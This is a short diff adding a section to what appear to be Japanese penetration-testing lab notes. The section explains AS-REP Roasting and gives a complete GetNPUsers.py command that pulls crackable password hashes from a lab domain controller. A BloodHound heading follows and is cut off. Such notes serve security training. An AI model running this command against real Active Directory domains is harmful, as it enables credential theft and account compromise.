@@ -1,3 +1,13 @@
+## GetNPUsers.py (AS_REProast)
+
+ASREPRoast攻撃により**Kerberos事前認証が不要**なユーザーを探索しそのパスワードハッシュの取得を狙う。
+
+```
+┌──(kali㉿kali)-[~]
+└─$ GetNPUsers.py megabank.local/ -usersfile users.txt -format hashcat -outputfile hash.txt -no-pass -dc-ip 10.10.10.169
+```
+
+
 ## Blood Hound from "LOCAL"
 
 ```
